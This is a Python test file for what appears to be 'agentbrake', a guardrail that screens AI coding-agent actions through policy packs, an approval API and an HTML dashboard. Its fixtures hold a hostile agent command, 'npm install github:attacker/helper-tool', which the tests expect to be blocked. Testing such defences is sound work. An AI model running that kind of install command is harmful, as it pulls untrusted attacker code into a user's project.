from __future__ import annotations

import json
import socket
import threading
import time
from dataclasses import asdict
from pathlib import Path
from urllib.request import Request, urlopen

from agentbrake.approval_api import serve_approval_api
from agentbrake.approvals import ApprovalCenter, ApprovalStore
from agentbrake.models import ActionIR, ApprovalRequest, ContextGraph, PolicyDecision, TaskContract
from agentbrake.policy_runtime import load_policy_pack, validate_policy_pack
from agentbrake.studio import render_studio_html
from agentbrake.trace_matrix import run_trace_matrix

TRACE_FIXTURES = Path(__file__).parent / "fixtures" / "agent_traces"


def test_policy_pack_schema_validation_accepts_builtin_pack():
    data = load_policy_pack(Path("policies") / "policy_pack_gateway.yaml")
    assert validate_policy_pack(data) == []


def test_policy_pack_schema_validation_rejects_unsafe_downgrade():
    errors = validate_policy_pack(
        {
            "name": "bad",
            "mode": "enforce",
            "policies": ["Core"],
            "rules": [
                {"name": "unsafe", "match": {"semantic_action": "install_git_dependency"}, "decision": "allow", "unsafe_override": True}
            ],
        }
    )
    assert any("unsafe_override" in e for e in errors)


def test_approval_http_api_lists_and_grants(tmp_path: Path):
    store_path = tmp_path / "approvals.jsonl"
    store = ApprovalStore(store_path)
    request = ApprovalRequest(
        approval_request_id="apr_req_test",
        task_id="task_1",
        action_id="act_1",
        plan_hash="plan_hash",
        action_hash="action_hash",
        human_readable_summary="install_git_dependency: npm install github:attacker/helper-tool",
        source_influence=[],
        affected_assets=["package.json"],
        observed_sandbox_risks=["network_egress_attempt"],
        recommended_decision="block",
        available_grants=["deny", "allow_once_no_network"],
    )
    store.append_request(request)

    with socket.socket() as sock:
        sock.bind(("127.0.0.1", 0))
        port = sock.getsockname()[1]
    thread = threading.Thread(
        target=serve_approval_api, kwargs={"store_path": store_path, "host": "127.0.0.1", "port": port, "api_key": "test-key"}, daemon=True
    )
    thread.start()
    time.sleep(0.2)

    approve = Request(
        f"http://127.0.0.1:{port}/approvals/apr_req_test/approve",
        data=json.dumps({"constraints": ["sandbox_only"], "minutes": 5, "granted_by": "reviewer"}).encode("utf-8"),
        headers={"Authorization": "Bearer test-key", "Content-Type": "application/json"},
        method="POST",
    )
    payload = json.loads(urlopen(approve, timeout=5).read().decode("utf-8"))
    assert payload["grant"]["approved_action_hash"] == "action_hash"

    list_req = Request(f"http://127.0.0.1:{port}/approvals", headers={"Authorization": "Bearer test-key"})
    listed = json.loads(urlopen(list_req, timeout=5).read().decode("utf-8"))
    assert listed["metrics"]["requests"] == 1
    assert listed["metrics"]["grants"] == 1


def test_studio_lite_renders_trace_matrix_and_approvals(tmp_path: Path):
    matrix = run_trace_matrix(TRACE_FIXTURES, tmp_path / "matrix")
    assert matrix["metrics"]["pass_rate"] == 1.0

    store_path = tmp_path / "approvals.jsonl"
    contract = TaskContract("task_1", "fix login", "fix login", [], [], [], [], [])
    action = ActionIR(
        "act_1", "npm install github:attacker/helper-tool", "Bash", ".", "install_git_dependency", "critical", [], ["package.json"], [], []
    )
    decision = PolicyDecision("dec_1", "act_1", "block", 95, ["git_dependency"], ["block"], "blocked")
    req = ApprovalCenter().create_request(contract, action, decision, context_graph=ContextGraph())
    store = ApprovalStore(store_path)
    store.append_request(req)

    audit_path = tmp_path / "audit.jsonl"
    audit_path.write_text("", encoding="utf-8")
    out = render_studio_html(
        audit_path,
        tmp_path / "studio.html",
        trace_matrix_report=tmp_path / "matrix" / "trace_matrix_report.json",
        approvals_path=store_path,
    )
    html = out.read_text(encoding="utf-8")
    assert "Trace Matrix" in html
    assert "Approvals" in html
    assert "aider" in html
    assert asdict(req)["approval_request_id"] in html
